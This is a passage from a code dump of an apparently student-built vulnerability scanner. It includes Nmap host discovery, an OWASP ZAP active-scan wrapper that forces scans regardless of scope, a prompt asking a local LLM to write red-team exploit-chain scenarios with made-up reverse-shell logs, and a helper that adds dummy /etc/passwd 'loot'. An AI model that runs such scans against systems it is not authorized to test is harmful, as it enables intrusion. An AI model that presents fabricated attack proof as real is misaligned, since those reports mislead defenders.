        high = sum(1 for v in vulnerabilities if v.get("severity") == "HIGH")
        medium = sum(1 for v in vulnerabilities if v.get("severity") == "MEDIUM")
        low = sum(1 for v in vulnerabilities if v.get("severity") == "LOW")
        
        # 평균 CVSS 점수
        cvss_scores = [v.get("cvss_score", 0) for v in vulnerabilities if v.get("cvss_score")]
        avg_cvss = sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0.0
        
        summary = {
            "scan_date": datetime.now().isoformat(),
            "overview": {
                "total_vulnerabilities": total_vulns,
                "critical": critical,
                "high": high,
                "medium": medium,
                "low": low,
                "average_cvss": round(avg_cvss, 1)
            },
            "risk_assessment": {
                "overall_risk": "HIGH" if critical > 0 or high > 5 else "MEDIUM" if high > 0 else "LOW",
                "critical_findings": critical,
                "recommendation": self._generate_recommendation(critical, high)
            },
            "top_vulnerabilities": sorted(
                vulnerabilities,
                key=lambda v: v.get("cvss_score", 0),
                reverse=True
            )[:5],
            "attack_paths": attack_paths or [],
            "compliance": {
                "owasp_top10_mapping": self._map_to_owasp_top10(vulnerabilities),
                "cwe_mapping": self._map_to_cwe(vulnerabilities)
            }
        }
        
        return summary
    
    def _generate_recommendation(self, critical: int, high: int) -> str:
        """권장사항 생성"""
        if critical > 0:
            return "즉시 조치 필요: Critical 취약점 발견. 우선순위로 패치 및 완화 조치를 수행하세요."
        elif high > 5:
            return "긴급 조치 권장: 다수의 High 취약점 발견. 1주일 내 패치 계획 수립 필요."
        elif high > 0:
            return "조치 권장: High 취약점 발견. 1개월 내 패치 계획 수립 필요."
        else:
            return "지속적 모니터링: 현재 발견된 취약점은 낮은 우선순위입니다."
    
    def _map_to_owasp_top10(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, List[Dict]]:
        """OWASP Top 10 매핑"""
        owasp_mapping = {
            "A01:2021-Broken Access Control": [],
            "A02:2021-Cryptographic Failures": [],
            "A03:2021-Injection": [],
            "A04:2021-Insecure Design": [],
            "A05:2021-Security Misconfiguration": [],
            "A06:2021-Vulnerable Components": [],
            "A07:2021-Authentication Failures": [],
            "A08:2021-Software and Data Integrity": [],
            "A09:2021-Security Logging Failures": [],
            "A10:2021-Server-Side Request Forgery": []
        }
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get("type", "").lower()
            
            if "injection" in vuln_type or "sql" in vuln_type or "xss" in vuln_type:
                owasp_mapping["A03:2021-Injection"].append(vuln)
            elif "authentication" in vuln_type or "session" in vuln_type:
                owasp_mapping["A07:2021-Authentication Failures"].append(vuln)
            elif "ssrf" in vuln_type:
                owasp_mapping["A10:2021-Server-Side Request Forgery"].append(vuln)
            elif "access" in vuln_type or "idor" in vuln_type:
                owasp_mapping["A01:2021-Broken Access Control"].append(vuln)
            elif "misconfiguration" in vuln_type:
                owasp_mapping["A05:2021-Security Misconfiguration"].append(vuln)
        
        return owasp_mapping
    
    def _map_to_cwe(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, List[Dict]]:
        """CWE ID 매핑"""
        cwe_mapping = {
            "CWE-89": [],  # SQL Injection
            "CWE-79": [],  # XSS
            "CWE-352": [],  # CSRF
            "CWE-22": [],  # Path Traversal
            "CWE-78": [],  # Command Injection
            "CWE-611": [],  # XXE
            "CWE-918": [],  # SSRF
            "CWE-434": [],  # File Upload
            "CWE-798": [],  # Hard-coded Credentials
            "CWE-200": []   # Information Exposure
        }
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get("type", "").lower()
            
            if "sql injection" in vuln_type:
                cwe_mapping["CWE-89"].append(vuln)
            elif "xss" in vuln_type:
                cwe_mapping["CWE-79"].append(vuln)
            elif "path traversal" in vuln_type or "lfi" in vuln_type:
                cwe_mapping["CWE-22"].append(vuln)
            elif "command injection" in vuln_type:
                cwe_mapping["CWE-78"].append(vuln)
            elif "xxe" in vuln_type:
                cwe_mapping["CWE-611"].append(vuln)
            elif "ssrf" in vuln_type:
                cwe_mapping["CWE-918"].append(vuln)
            elif "information" in vuln_type or "disclosure" in vuln_type:
                cwe_mapping["CWE-200"].append(vuln)
        
        return cwe_mapping
    
    def export_report(
        self,
        format: str = "json",
        output_file: Optional[str] = None
    ) -> str:
        """
        리포트 내보내기
        
        Args:
            format: "json", "html", "pdf"
            output_file: 출력 파일 경로
        """
        report = {
            "scan_date": datetime.now().isoformat(),
            "evidence": self.evidence_collection,
            "poc_scripts": self.poc_scripts
        }
        
        if format == "json":
            report_json = json.dumps(report, indent=2, ensure_ascii=False)
            if output_file:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(report_json)
            return report_json
        
        # HTML, PDF 형식은 추후 구현
        return ""

```
---

## File 38: scanner.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scanner.py`

```python
import asyncio
import ipaddress
import subprocess
import xml.etree.ElementTree as ET
from typing import List, Dict, Any
import logging
import concurrent.futures

logger = logging.getLogger(__name__)

def parse_cidr(network_cidr: str) -> List[str]:
    """CIDR를 IP 리스트로 변환"""
    try:
        network = ipaddress.ip_network(network_cidr, strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError as e:
        logger.error(f"Invalid CIDR: {network_cidr}, Error: {e}")
        return []

def discover_alive_hosts(network_cidr: str, timeout: int = 300) -> List[str]:
    """Nmap -sn으로 살아있는 호스트 탐지"""
    print(f"[DISCOVERY] 🔍 Discovering alive hosts in {network_cidr}...")
    logger.info(f"[DISCOVERY] Starting host discovery for {network_cidr}")
    
    alive_hosts = []
    
    try:
        # Nmap Ping Scan
        result = subprocess.run(
            ["nmap", "-sn", "-oX", "-", network_cidr],
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        if result.returncode != 0:
            print(f"[DISCOVERY] ✗ Nmap failed: {result.stderr}")
            return []
        
        # XML 파싱
        root = ET.fromstring(result.stdout)
        
        for host in root.findall('host'):
            status = host.find('status')
            if status is not None and status.get('state') == 'up':
                address = host.find('address')
                if address is not None:
                    ip = address.get('addr')
                    alive_hosts.append(ip)
                    print(f"[DISCOVERY] ✓ Found alive host: {ip}")
        
        print(f"[DISCOVERY] ✅ Found {len(alive_hosts)} alive hosts")
        logger.info(f"[DISCOVERY] Discovered {len(alive_hosts)} hosts")
        
    except subprocess.TimeoutExpired:
        print(f"[DISCOVERY] ✗ Discovery timeout after {timeout}s")
        logger.error(f"[DISCOVERY] Timeout after {timeout}s")
    except Exception as e:
        print(f"[DISCOVERY] ✗ Error: {e}")
        logger.error(f"[DISCOVERY] Error: {e}")
    
    return alive_hosts

def scan_single_host_sync(ip: str, ports: List[int] = [80, 443, 8080, 8000, 3000]) -> Dict[str, Any]:
    """
    단일 호스트 스캔 (동기 버전)
    
    Args:
        ip: 타겟 IP
        ports: 스캔할 포트 리스트
        
    Returns:
        스캔 결과
    """
    # 순환 import 방지: 함수 내부에서 import
    from ..workflow import async_scan_workflow
    import asyncio
    
    print(f"[SCANNER] 🎯 Scanning {ip}...")
    logger.info(f"[SCANNER] Starting scan for {ip}")
    
    results = {
        "ip": ip,
        "scan_results": [],
        "total_cves": 0,
        "total_techs": 0
    }
    
    # 각 포트에 대해 스캔
    for port in ports:
        target = f"http://{ip}:{port}"
        
        try:
            # 새 이벤트 루프에서 실행
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                result = loop.run_until_complete(async_scan_workflow(target))
                
                if result and result.get('recon'):
                    technologies = []
                    for host in result.get('recon', []):
                        for port_info in host.get('ports', []):
                            technologies.append({
                                'product': port_info.get('product', 'Unknown'),
                                'version': port_info.get('version', 'N/A')
                            })
                    
                    cves = result.get('cves', [])
                    
                    if technologies or cves:
                        results["scan_results"].append({
                            "port": port,
                            "url": target,
                            "technologies": technologies,
                            "cves": cves
                        })
                        results["total_cves"] += len(cves)
                        results["total_techs"] += len(technologies)
                        
                        print(f"[SCANNER] ✓ {ip}:{port} - Found {len(technologies)} techs, {len(cves)} CVEs")
            finally:
                loop.close()
        
        except Exception as e:
            print(f"[SCANNER] ✗ {ip}:{port} - Error: {e}")
            logger.error(f"[SCANNER] Error scanning {ip}:{port}: {e}")
            continue
    
    return results

def run_network_scan(network_cidr: str, max_concurrent: int = 5) -> Dict[str, Any]:
    """
    네트워크 대역 전체 스캔 (ThreadPoolExecutor 사용)
    
    Args:
        network_cidr: 예) 192.168.1.0/24
        max_concurrent: 동시 실행 제한 (기본 5)
        
    Returns:
        전체 네트워크 스캔 결과
    """
    print("=" * 70)
    print(f"[NETWORK-SCAN] 🚀 Starting network scan: {network_cidr}")
    print(f"[NETWORK-SCAN] Max concurrent scans: {max_concurrent}")
    print("=" * 70)
    
    # 1단계: 살아있는 호스트 탐지
    alive_hosts = discover_alive_hosts(network_cidr)
    
    if not alive_hosts:
        print("[NETWORK-SCAN] ✗ No alive hosts found!")
        return {
            "network": network_cidr,
            "alive_hosts": 0,
            "scanned_hosts": 0,
            "results": []
        }
    
    # 2단계: ThreadPoolExecutor로 병렬 스캔
    print(f"[NETWORK-SCAN] 🔄 Starting parallel scan of {len(alive_hosts)} hosts...")
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent) as executor:
        future_to_ip = {executor.submit(scan_single_host_sync, ip): ip for ip in alive_hosts}
        
        for future in concurrent.futures.as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                result = future.result()
                results.append(result)
                print(f"[NETWORK-SCAN] ✓ Completed scan for {ip}")
            except Exception as e:
                print(f"[NETWORK-SCAN] ✗ Error scanning {ip}: {e}")
                logger.error(f"[NETWORK-SCAN] Error scanning {ip}: {e}")
    
    # 3단계: 결과 요약
    summary = {
        "network": network_cidr,
        "alive_hosts": len(alive_hosts),
        "scanned_hosts": len(results),
        "total_cves": sum(r.get("total_cves", 0) for r in results),
        "total_techs": sum(r.get("total_techs", 0) for r in results),
        "vulnerable_hosts": len([r for r in results if r.get("total_cves", 0) > 0]),
        "results": results
    }
    
    print("=" * 70)
    print(f"[NETWORK-SCAN] ✅ Network scan completed!")
    print(f"[NETWORK-SCAN] 📊 Summary:")
    print(f"  - Alive hosts: {summary['alive_hosts']}")
    print(f"  - Scanned hosts: {summary['scanned_hosts']}")
    print(f"  - Vulnerable hosts: {summary['vulnerable_hosts']}")
    print(f"  - Total CVEs: {summary['total_cves']}")
    print(f"  - Total technologies: {summary['total_techs']}")
    print("=" * 70)
    
    return summary
```
---

## File 39: __init__.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scanner\__init__.py`

```python
# app/core/scanner/__init__.py

from .zap_scanner import ZapScanner, format_alerts_for_dashboard

__all__ = ['ZapScanner', 'format_alerts_for_dashboard']
```
---

## File 40: zap_scanner.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scanner\zap_scanner.py`

```python
# app/core/scanner/zap_scanner.py

import time
import logging
from typing import Dict, List, Any, Optional
from zapv2 import ZAPv2
from app.config import Config

logger = logging.getLogger(__name__)

class ZapScanner:
    """
    OWASP ZAP API를 사용한 자동 보안 스캔 클래스
    Spider(크롤링) -> Active Scan(공격 스캔) -> Alert 수집
    
    [개선 사항] 2026-01-06
    - Katana/Nuclei 등 외부 도구에서 수집한 URL을 받아
      중복 크롤링 없이 즉시 Active Scan을 수행하는 최적화 모드 추가
    """
    
    def __init__(
        self,
        api_key: str = None,
        proxy_host: str = None,
        proxy_port: int = None,
        timeout: int = None
    ):
        """ZAP 클라이언트 초기화"""
        self.api_key = api_key or Config.ZAP_API_KEY
        self.proxy_host = proxy_host or Config.ZAP_PROXY_HOST
        self.proxy_port = proxy_port or Config.ZAP_PROXY_PORT
        self.timeout = timeout or Config.ZAP_TIMEOUT
        
        proxies = {
            'http': f'http://{self.proxy_host}:{self.proxy_port}',
            'https': f'http://{self.proxy_host}:{self.proxy_port}'
        }
        
        try:
            self.zap = ZAPv2(apikey=self.api_key, proxies=proxies)
            logger.info(f"ZAP Client initialized: {self.proxy_host}:{self.proxy_port}")
        except Exception as e:
            logger.error(f"Failed to initialize ZAP client: {e}")
            raise

    def access_target(self, target_url: str) -> bool:
        """
        ZAP이 해당 URL을 인지하도록 단순 접속 (ZAP Tree 등록용)
        """
        try:
            # logger.info(f"Accessing target URL: {target_url}")
            # followredirects=True로 설정하여 최종 목적지까지 도달하게 함
            self.zap.core.access_url(url=target_url, followredirects=True)
            # time.sleep(1) # 너무 빠른 요청 방지
            return True
        except Exception as e:
            logger.error(f"Failed to access target: {e}")
            return False

    def run_spider(self, target_url: str, max_children: Optional[int] = None) -> Dict[str, Any]:
        """
        [Legacy] ZAP 자체 스파이더 실행 (느릴 수 있음)
        """
        try:
            logger.info(f"Starting Spider scan on: {target_url}")
            if max_children is None:
                max_children = 100
            
            scan_id = self.zap.spider.scan(
                url=target_url,
                maxchildren=max_children,
                recurse=True
            )
            
            logger.info(f"Spider scan started. Scan ID: {scan_id}")
            
            start_time = time.time()
            timeout = 300  # 5분 제한
            
            while True:
                try:
                    status = self.zap.spider.status(scan_id)
                    progress = int(status)
                    if progress >= 100:
                        break
                    if time.time() - start_time > timeout:
                        self.zap.spider.stop(scan_id)
                        break
                    time.sleep(2)
                except (ValueError, TypeError):
                    break
            
            urls_found = self.zap.spider.results(scan_id)
            return {
                'scan_id': scan_id,
                'status': 'completed',
                'urls_found': urls_found,
                'progress': 100
            }
        except Exception as e:
            logger.error(f"Spider scan failed: {e}")
            return {'status': 'failed', 'error': str(e)}

    def run_active_scan(self, target_url: str, recurse: bool = True, scan_policy_name: str = None, context_id: str = None) -> Dict[str, Any]:
        """
        단일 URL에 대한 Active Scan 실행
        """
        try:
            logger.info(f"Starting Active Scan on: {target_url} (Recurse: {recurse})")
            scan_id = self.zap.ascan.scan(
                url=target_url,
                recurse=recurse,
                scanpolicyname=scan_policy_name,
                postdata=True,
                contextid=context_id
            )
            
            if not scan_id or scan_id == 'does_not_exist' or not str(scan_id).isdigit():
                return {'status': 'failed', 'error': f"Invalid scan ID: {scan_id}"}
            
            # 비동기 처리를 위해 대기하지 않고 ID만 리턴하는 것이 좋을 수 있으나,
            # 현재 구조상 대기 로직 유지 (타임아웃 적용)
            start_time = time.time()
            while True:
                try:
                    status = self.zap.ascan.status(scan_id)
                    progress = int(status)
                    if progress >= 100:
                        break
                    if time.time() - start_time > self.timeout:
                        self.zap.ascan.stop(scan_id)
                        break
                    time.sleep(5)
                except (ValueError, TypeError):
                    break
            
            return {'scan_id': scan_id, 'status': 'completed', 'progress': 100}
        except Exception as e:
            logger.error(f"Active scan failed: {e}")
            return {'status': 'failed', 'error': str(e)}

    def run_active_scan_on_list(self, target_urls: List[str]) -> Dict[str, Any]:
        """
        [최적화됨] URL 리스트를 받아 '크롤링 없이' 즉시 공격 수행
        Katana 등으로 찾은 URL들을 한꺼번에 ZAP에 던져서 병렬 스캔 효과를 냄
        """
        logger.info(f"Starting Optimized ZAP Scan on {len(target_urls)} URLs (No Spidering)")
        
        scanned_count = 0
        failed_count = 0
        
        # 1. Seeding: ZAP이 URL들을 인식하도록 한 번씩 찔러줌
        for url in target_urls:
            self.access_target(url)
            
        # 2. Active Scan: 리스트에 있는 URL들만 타격 (recurse=False)
        for url in target_urls:
            try:
                # recurse=False: 하위 경로 탐색 금지 (이미 Katana가 다 찾음)
                # inscopeonly=False: 스코프 무관하게 강제 스캔
                scan_id = self.zap.ascan.scan(
                    url=url, 
                    recurse=False, 
                    inscopeonly=False
                )
                logger.debug(f"Launched Active Scan for: {url} (ID: {scan_id})")
                scanned_count += 1
            except Exception as e:
                logger.error(f"Failed to launch scan for {url}: {e}")
                failed_count += 1

        # 3. 모든 스캔이 끝날 때까지 대기
        self.wait_for_scans_to_finish()
        
        return {
            "status": "completed",
            "scanned_count": scanned_count,
            "failed_count": failed_count
        }

    def wait_for_scans_to_finish(self):
        """현재 실행 중인 모든 Active Scan이 완료될 때까지 대기"""
        logger.info("Waiting for all ZAP active scans to complete...")
        while True:
            try:
                scans = self.zap.ascan.scans
                if not scans:
                    break
                
                running_scans = [s for s in scans if s.get('state') != 'FINISHED']
                if not running_scans:
                    break
                    
                # 진행 상황 로깅 (선택 사항)
                # logger.debug(f"Remaining scans: {len(running_scans)}")
                time.sleep(5)
            except Exception:
                break
        logger.info("All ZAP active scans completed.")

    def get_alerts(self, base_url: Optional[str] = None, risk_levels: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        try:
            if risk_levels is None:
                risk_levels = ['High', 'Medium']
            
            # baseurl이 있으면 해당 사이트만, 없으면 전체 알림 가져오기
            all_alerts = self.zap.core.alerts(baseurl=base_url)
            filtered_alerts = []
            
            for alert in all_alerts:
                if alert.get('risk') in risk_levels:
                    filtered_alerts.append({
                        'alert': alert.get('alert', ''),
                        'risk': alert.get('risk', ''),
                        'url': alert.get('url', ''),
                        'evidence': alert.get('evidence', ''),
                        'description': alert.get('description', ''),
                        'solution': alert.get('solution', ''),
                        'confidence': alert.get('confidence', '')
                    })
            return filtered_alerts
        except Exception as e:
            logger.error(f"Failed to fetch alerts: {e}")
            return []

    def targeted_scan(self, target_urls: List[str]) -> Dict[str, Any]:
        """
        Nuclei 등에서 발견된 특정 URL만 정밀 타격 (Funnel 전략)
        Legacy 호환성을 위해 유지하되, 내부적으로는 최적화 로직 사용 가능
        """
        return self.fast_scan_with_external_urls(target_urls)

    def full_scan(self, target_url: str, run_spider: bool = True, run_active: bool = True, risk_levels: List[str] = None) -> Dict[str, Any]:
        """
        [Legacy] 전체 스캔 워크플로우 (하위 호환성 유지)
        """
        try:
            if not self.access_target(target_url):
                raise Exception("Failed to access target URL")
                
            spider_res = {}
            if run_spider:
                spider_res = self.run_spider(target_url)
                
            active_res = {}
            if run_active:
                active_res = self.run_active_scan(target_url)
                
            alerts = self.get_alerts(base_url=target_url, risk_levels=risk_levels)
            
            return {
                'target': target_url,
                'spider_result': spider_res,
                'active_scan_result': active_res,
                'alerts': alerts
            }
        except Exception as e:
            return {'error': str(e)}
            
    def fast_scan_with_external_urls(self, url_list: List[str]) -> Dict[str, Any]:
        """
        [NEW] Katana/Crawler 결과 리스트를 받아 고속 스캔 수행
        """
        try:
            if not url_list:
                return {'error': 'No URLs provided'}

            # 1. 스파이더 생략하고 바로 Active Scan 리스트 처리
            scan_result = self.run_active_scan_on_list(url_list)
            
            # 2. 결과(Alerts) 수집
            # 주의: base_url을 지정하지 않으면 ZAP에 쌓인 모든 알림을 가져옴
            # 필요하다면 url_list[0]의 도메인을 base_url로 추출해서 필터링 가능
            alerts = self.get_alerts(risk_levels=['High', 'Medium', 'Low'])
            
            return {
                'scan_summary': scan_result,
                'alerts': alerts
            }
        except Exception as e:
            logger.error(f"Fast scan failed: {e}")
            return {'error': str(e)}

def format_alerts_for_dashboard(alerts):
    """ZAP 경고 데이터를 대시보드 표시 형식으로 변환"""
    formatted = []
    for alert in alerts:
        formatted.append({
            'name': alert.get('alert', 'Unknown'),
            'risk': alert.get('risk', 'Informational'),
            'url': alert.get('url', ''),
            'description': alert.get('description', ''),
            'solution': alert.get('solution', ''),
            'evidence': alert.get('evidence', '')
        })
    return formatted
```
---

## File 41: __init__.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scenario\__init__.py`

```python
# Attack scenario generation modules

```
---

## File 42: generator.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scenario\generator.py`

```python
# app/core/scenario/generator.py

import requests
import json
from flask import current_app


def build_executive_prompt(cve_list, recon_info, chains, exploit_map):
    """
    Executive Summary용 프롬프트 (간결한 보고서)
    """
    instructions = """
너는 15년 경력의 화이트해커이자 레드팀 리더야.
아래 제공하는 Nmap 스캔 결과(recon_info), CVE 목록(cve_list),
공격 체인 후보(chains), 그리고 각 CVE에 대한 Searchsploit exploit 리스트(exploit_map)를 바탕으로,
공격자 입장에서 가장 효율적인 '침투 체인(Exploit Chain)'을 설계해줘.

요구사항:

1. 반드시 chains에 있는 CVE들만 사용해서 공격 시나리오를 구성해.
   - 새로운 CVE ID를 만들어내거나, 입력에 없는 CVE를 사용하지 마.
2. 가능한 한 현실적인 1~2개의 공격 체인만 선택해서 상세 시나리오를 작성해.
   - 각 체인은 initial_access -> privilege_escalation -> lateral_movement -> data_exfiltration
     순서를 따르려고 노력해. 중간 단계가 없어도 괜찮지만, 순서를 뒤집지는 마.
3. Searchsploit ID는 "참고용"으로만 사용해.
   - 실제 payload 문자열이나 완전한 exploit 코드는 생성하지 말고,
     개념적인 단계와 영향만 설명해.
4. 모르는 부분은 지어내지 말고 "unknown"이라고 표기해.

출력 형식:

반드시 JSON 하나만 보내. 다른 설명 문장이나 주석은 넣지 마.

JSON 스키마 예시는 다음과 같아:

{
  "selected_chains": [
    {
      "chain_id": 1,
      "description": "요약 설명",
      "steps": [
        "1단계: CVE-XXXX-AAAA (initial_access), Searchsploit ID 50383을 참고하여 8080 포트 Apache 웹서버에서 Path Traversal 기반 RCE를 시도한다 ...",
        "2단계: CVE-YYYY-BBBB (privilege_escalation)를 이용해 www-data에서 root로 권한 상승을 시도한다 ...",
        "3단계: CVE-ZZZZ-CCCC (data_exfiltration)를 통해 MySQL DB에서 중요한 데이터를 덤프한다 ..."
      ]
    }
  ],
  "scenario": [
    "... 전체 공격 과정을 해커 입장에서 서술한 시나리오 ..."
  ],
  "proof": {
    "loot_files": [
      {
        "path": "/etc/passwd",
        "content": "root:x:0:0:root:/root:/bin/bash\n..."
      }
    ],
    "logs": [
      "[+] Exploit CVE-XXXX-AAAA sent to 203.0.113.10:8080",
      "[+] Got reverse shell: www-data@target",
      "[+] Escalated to root using CVE-YYYY-BBBB",
      "[+] Dumped /etc/passwd and user table from MySQL (size: 32KB)"
    ]
  },
  "mermaid_diagram": "graph TD\n    A[정찰: Nmap Scan] --> B[CVE-XXXX-AAAA: Initial Access]\n    B --> C[CVE-YYYY-BBBB: Privilege Escalation]\n    C --> D[CVE-ZZZZ-CCCC: Data Exfiltration]\n    D --> E[Mission Complete]"
}

주의:

- 실제 IP나 민감 정보는 모두 더미 값(예: 203.0.113.10, 198.51.100.5)으로 바꿔줘.
- selected_chains의 steps에는 반드시 어떤 CVE를 어떤 역할(role)로 쓰는지, 어느 포트/서비스와 연결되는지 명시해.
- **mermaid_diagram 필드를 반드시 포함해. Mermaid.js flowchart 문법으로 작성해.**
"""

    recon_text = json.dumps(recon_info, ensure_ascii=False, indent=2)
    cve_text = json.dumps(cve_list, ensure_ascii=False, indent=2)
    chains_text = json.dumps(chains, ensure_ascii=False, indent=2)
    exploit_text = json.dumps(exploit_map, ensure_ascii=False, indent=2)

    prompt = f"""{instructions}

[recon_info]
{recon_text}

[cve_list]
{cve_text}

[chains]
{chains_text}

[exploit_map]
{exploit_text}
"""
    return prompt


def build_prompt(cve_list, recon_info, chains, exploit_map):
    """
    기존 호환성을 위한 래퍼 함수
    """
    return build_executive_prompt(cve_list, recon_info, chains, exploit_map)


def call_ollama(prompt: str):
    """
    Ollama LLM 호출
    """
    base_url = current_app.config["OLLAMA_BASE_URL"]
    model = current_app.config["OLLAMA_MODEL"]
    url = f"{base_url}/api/generate"

    payload = {
        "model": model,
        "prompt": prompt,
        "stream": False,
    }

    try:
        resp = requests.post(url, json=payload, timeout=300)
        resp.raise_for_status()
    except requests.exceptions.RequestException as e:
        return {
            "selected_chains": [],
            "scenario": [f"[AI 호출 실패] {e}"],
            "proof": {
                "loot_files": [],
                "logs": [],
            },
            "mermaid_diagram": ""
        }

    data = resp.json()
    raw_text = data.get("response", "")

    try:
        parsed = json.loads(raw_text)
        
        # Mermaid diagram이 없으면 기본값 생성
        if "mermaid_diagram" not in parsed:
            parsed["mermaid_diagram"] = generate_default_mermaid(parsed.get("selected_chains", []))
        
        return parsed
    except json.JSONDecodeError:
        return {
            "selected_chains": [],
            "scenario": [raw_text],
            "proof": {
                "loot_files": [],
                "logs": [],
            },
            "mermaid_diagram": ""
        }


def generate_default_mermaid(chains):
    """
    LLM이 Mermaid를 생성하지 못했을 때 기본 다이어그램 생성
    """
    if not chains or len(chains) == 0:
        return "graph TD\n    A[No Attack Chain Available]"
    
    diagram = "graph TD\n"
    diagram += "    Start[정찰: Recon] --> Step1\n"
    
    for i, chain in enumerate(chains):
        steps = chain.get('steps', [])
        for j, step in enumerate(steps):
            node_id = f"Step{i+1}_{j+1}"
            # Extract CVE ID from step text
            import re
            cve_match = re.search(r'CVE-\d{4}-\d+', step)
            cve_id = cve_match.group(0) if cve_match else f"Step {j+1}"
            
            if j == 0:
                diagram += f"    Step1[{cve_id}] --> {node_id}\n"
            else:
                prev_node = f"Step{i+1}_{j}"
                diagram += f"    {prev_node}[{cve_id}] --> {node_id}\n"
    
    diagram += f"    Step{len(chains)}_{len(steps)}[Complete] --> End[Mission Complete]\n"
    
    return diagram
```
---

## File 43: reporter.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scenario\reporter.py`

```python
# app/core/scenario/reporter.py
# 보고서 생성 모듈
# 기존 loot_generator.py를 기반으로 확장

import random
import datetime
from typing import Dict, Any, List


def enrich_loot(base_proof: Dict[str, Any]) -> Dict[str, Any]:
    """
    LLM이 준 proof에 더미 데이터를 추가하거나 형식을 보정.
    기존 loot_generator.py의 로직을 유지하면서 확장.
    
    Args:
        base_proof: AI가 생성한 proof 딕셔너리
            {
                "loot_files": [...],
                "logs": [...]
            }
    
    Returns:
        보강된 proof 딕셔너리
    """
    proof = base_proof or {}
    loot_files = proof.get("loot_files") or []
    logs = proof.get("logs") or []

    # 기본 /etc/passwd 더미가 없으면 하나 추가
    if not loot_files:
        loot_files.append({
            "path": "/etc/passwd",
            "content": (
                "root:x:0:0:root:/root:/bin/bash\n"
                "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                "demo:x:1000:1000:demo:/home/demo:/bin/bash\n"
            )
        })

    # 로그에 타임스탬프 추가
    timestamp = datetime.datetime.utcnow().isoformat() + "Z"
    logs.append(f"[{timestamp}] Demo attack simulation completed.")

    proof["loot_files"] = loot_files
    proof["logs"] = logs
    return proof

```
---

## File 44: scorer.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scorer.py`

```python
# app/core/scorer.py
"""
보안 점수 계산 시스템
A~F 등급 및 위험도 평가
"""

from typing import Dict, List, Any, Tuple


def calculate_security_score(vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
    """
    취약점 리스트를 기반으로 보안 점수 계산
    
    Args:
        vulnerabilities: CVE 취약점 리스트
        
    Returns:
        {
            'score': int (0-100),
            'grade': str (A~F),
            'risk_level': str (Safe/Low/Medium/High/Critical),
            'severity_counts': dict,
            'recommendations': list
        }
    """
    # 심각도별 카운트
    severity_counts = {
        'CRITICAL': 0,
        'HIGH': 0,
        'MEDIUM': 0,
        'LOW': 0,
        'NONE': 0
    }
    
    # 취약점 분류
    for vuln in vulnerabilities:
        severity = vuln.get('severity', 'NONE').upper()
        if severity in severity_counts:
            severity_counts[severity] += 1
        else:
            severity_counts['NONE'] += 1
    
    # 점수 계산 (100점 만점)
    score = 100
    score -= severity_counts['CRITICAL'] * 20  # Critical: -20점
    score -= severity_counts['HIGH'] * 10      # High: -10점
    score -= severity_counts['MEDIUM'] * 3     # Medium: -3점
    score -= severity_counts['LOW'] * 1        # Low: -1점
    
    # 최소 0점
    score = max(0, score)
    
    # 등급 계산 (A~F)
    if score >= 90:
        grade = 'A'
        risk_level = 'Safe'
    elif score >= 80:
        grade = 'B'
        risk_level = 'Low Risk'
    elif score >= 70:
        grade = 'C'
        risk_level = 'Medium Risk'
    elif score >= 60:
        grade = 'D'
        risk_level = 'High Risk'
    elif score >= 50:
        grade = 'E'
        risk_level = 'Critical Risk'
    else:
        grade = 'F'
        risk_level = 'Severe Risk'
    
    # 권장사항 생성
    recommendations = []
    
    if severity_counts['CRITICAL'] > 0:
        recommendations.append(f"🚨 {severity_counts['CRITICAL']}개의 치명적 취약점을 즉시 패치하세요.")
    
    if severity_counts['HIGH'] > 0:
        recommendations.append(f"⚠️ {severity_counts['HIGH']}개의 높은 위험 취약점을 우선 처리하세요.")
    
    if severity_counts['MEDIUM'] > 3:
        recommendations.append(f"📋 {severity_counts['MEDIUM']}개의 중간 위험 취약점을 검토하세요.")
    
    if score < 70:
        recommendations.append("🔒 WAF(웹 방화벽) 설정을 강화하세요.")
        recommendations.append("🔍 정기적인 보안 스캔을 수행하세요.")
    
    if not recommendations:
        recommendations.append("✅ 현재 보안 상태가 양호합니다. 정기 점검을 유지하세요.")
    
    return {
        'score': score,
        'grade': grade,
        'risk_level': risk_level,
        'severity_counts': severity_counts,
        'recommendations': recommendations,
        'total_vulnerabilities': len(vulnerabilities)
    }


def get_grade_color(grade: str) -> str:
    """등급별 색상 코드 반환"""
    colors = {
        'A': '#28a745',  # Green
        'B': '#5cb85c',  # Light Green
        'C': '#ffc107',  # Yellow
        'D': '#fd7e14',  # Orange
        'E': '#dc3545',  # Red
        'F': '#721c24'   # Dark Red
    }
    return colors.get(grade, '#6c757d')


def get_risk_level_badge(risk_level: str) -> str:
    """위험도별 뱃지 클래스 반환"""
    badges = {
        'Safe': 'success',
        'Low Risk': 'info',
        'Medium Risk': 'warning',
        'High Risk': 'danger',
        'Critical Risk': 'danger',
        'Severe Risk': 'dark'
    }
    return badges.get(risk_level, 'secondary')


def calculate_epss_priority(cve_data: Dict[str, Any]) -> float:
    """
    EPSS(Exploit Prediction Scoring System) 기반 우선순위 계산
    
    Args:
        cve_data: CVE 정보 (cvss, epss 포함)
        
    Returns:
        priority_score: 0.0 ~ 10.0 (높을수록 위험)
    """
    cvss = cve_data.get('cvss', 0.0)
    epss = cve_data.get('epss', 0.0)  # 0.0 ~ 1.0
    
    # CVSS(이론적 위험) 70% + EPSS(실제 공격 확률) 30%
    priority = (cvss * 0.7) + (epss * 10 * 0.3)
    
    return round(priority, 2)


